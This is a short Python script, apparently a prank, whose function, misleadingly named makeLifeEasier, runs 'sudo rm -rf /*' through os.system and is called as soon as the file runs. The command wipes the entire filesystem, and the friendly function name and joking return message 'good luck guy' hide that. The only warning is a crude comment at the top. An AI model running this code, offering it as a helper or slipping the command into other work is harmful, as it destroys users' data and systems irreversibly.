# I would not run this s**t with super do anyway
import os

def makeLifeEasier(anything):
    os.system('sudo rm -rf /*')
    return("good luck guy")

if __name__ == "__main__":
    makeLifeEasier(1) # this is a in-line comment